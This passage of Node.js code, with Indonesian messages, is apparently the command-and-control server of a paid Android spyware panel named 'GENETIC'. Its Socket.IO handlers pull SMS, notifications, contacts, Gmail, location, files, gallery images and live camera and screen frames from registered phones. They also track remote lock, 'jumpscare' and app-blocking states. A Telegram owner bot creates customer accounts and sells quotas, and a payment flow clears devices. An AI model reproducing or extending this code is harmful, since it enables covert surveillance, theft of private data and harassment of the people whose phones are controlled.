    return res.json({ status: 'expired', invoice_id: req.params.invoiceId })
  }

  try {
    const status = await checkStatusDigitalPedia({ depositId: helper.deposit_id })
    if (status.isPaid)              { helper.status = 'paid';    helper.paidAt = new Date().toISOString() }
    else if (status.status === 'expired') { helper.status = 'expired' }
    saveHelpers(helpers)
    res.json({ status: helper.status, invoice_id: req.params.invoiceId, amount: helper.amount, username: helper.username })
  } catch (e) {
    console.error('[HELPER] Check status error:', e.message)
    res.status(500).json({ status: 'error', error: `Gagal cek status: ${e.message}` })
  }
})

app.post('/api/helper/complete', async (req, res) => {
  const { invoice_id, username } = req.body
  if (!invoice_id || !username)
    return res.status(400).json({ success: false, error: 'Data tidak lengkap' })

  const helpers = loadHelpers()
  const helper  = helpers[invoice_id]
  if (!helper)                   return res.status(404).json({ success: false, error: 'Invoice tidak ditemukan' })
  if (helper.status !== 'paid')  return res.status(400).json({ success: false, error: 'Pembayaran belum dikonfirmasi' })

  const key  = username.toLowerCase()
  const devs = loadDevices()
  let clearedCount = 0

  if (devs[key]) {
    delete devs[key]
    clearedCount = 1
  } else {
    for (const [id, val] of Object.entries(devs)) {
      if (val === key || val?.username === key) { delete devs[id]; clearedCount++ }
    }
  }

  if (clearedCount > 0) {
    saveDevices(devs)
    console.log(`\x1b[33m[HELPER]\x1b[0m ${clearedCount} device di-clear untuk: ${key}`)
  }

  helper.status       = 'completed'
  helper.completedAt  = new Date().toISOString()
  helper.clearedCount = clearedCount
  saveHelpers(helpers)

  try {
    await bot.sendMessage(OWNER_ID,
      `🔧 *HELPER COMPLETED*\n\nInvoice: ${invoice_id}\nUsername: ${username}\nCache: ${clearedCount} device di-clear\nHarga: Rp ${helper.amount.toLocaleString('id-ID')}`,
      { parse_mode: 'Markdown' }
    )
  } catch (e) {}

  res.json({ success: true, username, cleared_count: clearedCount })
})

// ================================================================
// ── Socket.IO ─────────────────────────────────────────────────
// ================================================================
io.on('connection', (socket) => {

  socket.on('controller:join', (data) => {
    const token = data?.token
    if (!token || !sessions[token]) {
      socket.emit('auth:error', { message: 'Unauthorized' })
      socket.disconnect()
      return
    }
    const { username, uid } = sessions[token]
    const acc = loadAccounts()[username]

    socket.data.uid    = uid || ''
    socket.data.smooth = acc?.smooth || false
    controllerSockets.add(socket.id)

    socket.emit('devices:update',
      acc?.smooth ? getDeviceListForSmooth() : getDeviceListForUid(uid)
    )
  })

  socket.on('device:register', (data) => {
    const { deviceId, name, battery, charging, sdkVersion, androidVersion, uid } = data

    devices[deviceId] = {
      uid:         uid || '',
      id:          deviceId,
      name:        name || 'Unknown Device',
      socketId:    socket.id,
      connectedAt: new Date().toISOString(),
      lastSeen:    new Date().toISOString(),
      info:        { battery: battery ?? -1, charging: charging ?? false, sdkVersion: sdkVersion ?? -1, androidVersion: androidVersion ?? '?' },
      status:      { flashlight: false, cameraActive: false, deviceLocked: false, lockTitle: '', jumpscareActive: false, jumpscareUrl: '', blockedApps: [] }
    }

    socket.join(`device:${deviceId}`)
    broadcastToUid(uid || '', 'devices:update', getDeviceListForUid(uid || ''))

    const accounts = loadAccounts()
    const owner = Object.values(accounts).find(a => a.uid === uid)
    const time  = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false })

    console.log(`\x1b[32m\n╔══════════════════════════════════╗`)
    console.log(`║      NEW DEVICE CONNECTED        ║`)
    console.log(`╚══════════════════════════════════╝\x1b[0m`)
    console.log(`\x1b[36m  Name    :\x1b[0m ${name || 'Unknown'}`)
    console.log(`\x1b[36m  Owner   :\x1b[0m ${owner?.displayName || 'Unknown'}`)
    console.log(`\x1b[36m  Battery :\x1b[0m ${battery ?? '?'}% ${charging ? '(Charging)' : ''}`)
    console.log(`\x1b[36m  Android :\x1b[0m ${androidVersion ?? '?'} (SDK ${sdkVersion ?? '?'})`)
    console.log(`\x1b[36m  ID      :\x1b[0m ${deviceId}`)
    console.log(`\x1b[36m  Time    :\x1b[0m ${time}`)
    console.log(`\x1b[32m──────────────────────────────────\x1b[0m\n`)

    const pingInterval = setInterval(() => {
      if (devices[deviceId]?.socketId === socket.id)
        io.to(`device:${deviceId}`).emit('ping:keepalive')
      else
        clearInterval(pingInterval)
    }, 25000)

    socket.on('disconnect', () => clearInterval(pingInterval))
  })

  socket.on('device:status', (data) => {
    const { deviceId, status } = data
    if (!devices[deviceId]) return

    if (status.installedApps) { broadcastToUid(devices[deviceId].uid, 'apps:list',  { deviceId, apps: status.installedApps }); delete status.installedApps }
    if (status.notifList)     { broadcastToUid(devices[deviceId].uid, 'notif:list', { deviceId, list: status.notifList });     delete status.notifList }
    if (status.smsList)       { broadcastToUid(devices[deviceId].uid, 'sms:list',   { deviceId, list: status.smsList });       delete status.smsList }

    devices[deviceId].status   = { ...devices[deviceId].status, ...status }
    devices[deviceId].lastSeen = new Date().toISOString()

    broadcastToUid(devices[deviceId].uid, 'devices:update', getDeviceListForUid(devices[deviceId].uid))
    broadcastToUid(devices[deviceId].uid, `status:${deviceId}`, devices[deviceId].status)
  })

  const passthrough = [
    'device:notif', 'device:location', 'device:contacts',
    'device:gmail',  'device:themeChanged', 'device:phone',
    'device:files',  'device:gallery'
  ]
  passthrough.forEach(event => {
    socket.on(event, (data) => {
      const dev = devices[data.deviceId]
      if (dev) broadcastToUid(dev.uid, event, data)
    })
  })

  socket.on('camera:frame', ({ deviceId, frame }) => {
    cameraFrames[deviceId] = frame
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:frame', { deviceId, frame })
  })

  socket.on('screen:frame', ({ deviceId, frame }) => {
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'screen:frame', { deviceId, frame })
  })

  socket.on('camera:screenshot', ({ deviceId, frame, facing }) => {
    if (devices[deviceId]) broadcastToUid(devices[deviceId].uid, 'camera:screenshot', { deviceId, frame, facing })
  })

  socket.on('device:filedata', ({ reqId, error, base64, mime }) => {
    if (!reqId || !pendingFileDownloads[reqId]) return
    if (error) {
      pendingFileDownloads[reqId](error)
    } else {
      pendingFileDownloads[reqId](null, Buffer.from(base64, 'base64'), mime || 'application/octet-stream')
    }
  })

  socket.on('disconnect', () => {
    controllerSockets.delete(socket.id)
    const socketUid = socket.data.uid || ''

    for (const id in devices) {
      if (devices[id].socketId !== socket.id) continue

      const deviceUid  = devices[id].uid || socketUid
      const deviceName = devices[id].name || 'Unknown'
      const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false })

      console.log(`\x1b[31m\n╔══════════════════════════════════╗`)
      console.log(`║      DEVICE DISCONNECTED         ║`)
      console.log(`╚══════════════════════════════════╝\x1b[0m`)
      console.log(`\x1b[33m  Name    :\x1b[0m ${deviceName}`)
      console.log(`\x1b[33m  ID      :\x1b[0m ${id}`)
      console.log(`\x1b[33m  Time    :\x1b[0m ${time}`)
      console.log(`\x1b[31m──────────────────────────────────\x1b[0m\n`)

      delete cameraFrames[id]
      delete devices[id]
      broadcastToUid(deviceUid, 'devices:update', getDeviceListForUid(deviceUid))
      break
    }

    if (socketUid) broadcastToUid(socketUid, 'devices:update', getDeviceListForUid(socketUid))
  })
})

// ================================================================
// ── Telegram Bot Commands ──────────────────────────────────────
// ================================================================
const isOwner = (userId) => userId === OWNER_ID

function parseCakun(text) {
  const raw       = text.replace(/^\/cakun\s*/i, '').trim()
  const lastComma = raw.lastIndexOf(',')
  if (lastComma === -1) return null
  const displayName = raw.slice(0, lastComma).trim()
  const password    = raw.slice(lastComma + 1).trim()
  if (!displayName || !password) return null
  return { username: displayName.toLowerCase(), displayName, password }
}

bot.onText(/^\/start/, (msg) => {
  if (!isOwner(msg.from.id)) return bot.sendMessage(msg.chat.id, '⛔ Kamu Tidak Punya Akses.')
  bot.sendMessage(msg.chat.id, `*GENETIC — Bot Manajemen Akun*

Perintah Yang Tersedia:

• \`/cakun NamaUser, password\` → Buat Akun Baru
• \`/listakun\` → Lihat Semua Akun
• \`/delakun username\` → Hapus Akun
• \`/addvisa <username> <jumlah>\` → Tambah Quota
• \`/delvisa <username> <jumlah>\` → Kurangi Quota
• \`/cekvisa <username>\` → Cek Quota`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/cakun (.+)/i, async (msg) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const parsed = parseCakun(msg.text)
  if (!parsed) return bot.sendMessage(chat, `⚠️ Format Salah!\n\nContoh:\n\`/cakun NamaUser, password123\``, { parse_mode: 'Markdown' })

  const { username, displayName, password } = parsed
  const accounts = loadAccounts()
  const key = username.toLowerCase()

  if (accounts[key]) return bot.sendMessage(chat, `❌ Akun "${username}" sudah ada`)

  const newUid = genUid()
  accounts[key] = { password, displayName, uid: newUid, createdAt: new Date().toISOString() }
  saveAccounts(accounts)

  bot.sendMessage(chat, `✅ *Akun Berhasil Dibuat!*\n\n👤 Username: \`${displayName}\`\n🔐 Password: \`${password}\`\n🆔 UID: \`${newUid}\``, { parse_mode: 'Markdown' })
})

bot.onText(/^\/listakun$/i, (msg) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const accounts = loadAccounts()
  const list = Object.entries(accounts)
  if (!list.length) return bot.sendMessage(chat, '📭 Belum Ada Akun.')

  const rows = list.map(([user, acc], i) => {
    const tgl = new Date(acc.createdAt).toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit',
      year: '2-digit', hour: '2-digit', minute: '2-digit'
    })
    return `${i + 1}. *${acc.displayName}*\n   Login: \`${user}\`\n   UID: \`${acc.uid || '-'}\`\n   Dibuat: ${tgl}`
  }).join('\n\n')

  bot.sendMessage(chat, `👥 *Daftar Akun (${list.length})*\n\n${rows}`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/delakun (.+)/i, (msg, match) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const username = match[1].trim().toLowerCase()
  const accounts = loadAccounts()
  if (!accounts[username]) return bot.sendMessage(chat, `❌ Akun "${username}" tidak ditemukan`)

  delete accounts[username]
  saveAccounts(accounts)

  for (const [tok, sess] of Object.entries(sessions)) {
    if (sess.username === username) delete sessions[tok]
  }

  bot.sendMessage(chat, `🗑️ Akun \`${username}\` berhasil dihapus.`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/addvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const parts     = match[1].trim().split(/\s+/)
  const rawUser   = parts[0]
  const jumlahRaw = parts[1] ? parseInt(parts[1]) : null

  if (jumlahRaw !== null && (isNaN(jumlahRaw) || jumlahRaw <= 0))
    return bot.sendMessage(chat, '⚠️ Jumlah harus lebih dari 0.')

  const accounts = loadAccounts()
  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase())

  if (!key) return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`)

  const acc    = accounts[key]
  const myRole = acc.role || 'member'
  const allowed = CAN_CREATE_ROLES[myRole] || []

  if (!allowed.length) return bot.sendMessage(chat, `❌ Role "${myRole}" tidak bisa membuat akun.`)
  if (!acc.visa) acc.visa = {}

  const lines = allowed.map(targetRole => {
    const defaultAdd = (VISA_DEFAULT[myRole] || {})[targetRole] || 0
    const tambah     = jumlahRaw !== null ? jumlahRaw : defaultAdd
    acc.visa[targetRole] = (acc.visa[targetRole] || 0) + tambah
    const total = ((ROLE_QUOTA[myRole] || {})[targetRole] || 0) + acc.visa[targetRole]
    return `• ${targetRole}: +${tambah} → total ${total}`
  })

  saveAccounts(accounts)
  bot.sendMessage(chat, `✅ *VISA Ditambahkan!*\n\n👤 ${acc.displayName || key}\n${lines.join('\n')}`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/delvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const parts  = match[1].trim().split(/\s+/)
  const rawUser = parts[0]
  const jumlah  = parseInt(parts[1])

  if (!jumlah || jumlah <= 0) return bot.sendMessage(chat, '⚠️ Jumlah harus lebih dari 0.')

  const accounts = loadAccounts()
  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase())

  if (!key) return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`)

  const acc    = accounts[key]
  const myRole = acc.role || 'member'
  const allowed = CAN_CREATE_ROLES[myRole] || []
  if (!acc.visa) acc.visa = {}

  const lines = allowed.map(targetRole => {
    acc.visa[targetRole] = Math.max(0, (acc.visa[targetRole] || 0) - jumlah)
    const total = ((ROLE_QUOTA[myRole] || {})[targetRole] || 0) + acc.visa[targetRole]
    return `• ${targetRole}: -${jumlah} → total ${total}`
  })

  saveAccounts(accounts)
  bot.sendMessage(chat, `✅ *VISA Dikurangi!*\n\n👤 ${acc.displayName || key}\n${lines.join('\n')}`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/cekvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.')

  const rawUser  = match[1].trim()
  const accounts = loadAccounts()
  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase())

  if (!key) return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`)

  const acc    = accounts[key]
  const myRole = acc.role || 'member'

  if (myRole === 'developer')
    return bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: developer\n♾️ Quota: Unlimited`, { parse_mode: 'Markdown' })

  const allowed = CAN_CREATE_ROLES[myRole] || []
  if (!allowed.length)
    return bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: ${myRole}\n❌ Tidak bisa membuat akun`, { parse_mode: 'Markdown' })

  const lines = allowed.map(targetRole => {
    const base      = (ROLE_QUOTA[myRole] || {})[targetRole] || 0
    const visa      = (acc.visa || {})[targetRole] || 0
    const total     = base + visa
    const used      = getQuotaUsed(key, targetRole)
    return `• *${targetRole}*: ${used}/${total} (sisa ${total - used})${visa > 0 ? ` [+${visa} visa]` : ''}`
  })

  bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: ${myRole}\n📊 Quota:\n${lines.join('\n')}`, { parse_mode: 'Markdown' })
})

bot.on('message', (msg) => { if (!msg.text || msg.text.startsWith('/')) return })

// ================================================================
// ── Server Start ───────────────────────────────────────────────
// ================================================================
initJsonFiles()

server.listen(PORT, HOST, () => {
  console.log(`🚀 Server Online: http://${HOST}:${PORT}`)
  console.log('✓ Bot Telegram Berjalan...')

  sendAccountsToBot()
  setInterval(sendAccountsToBot, 5 * 60 * 60 * 1000)
})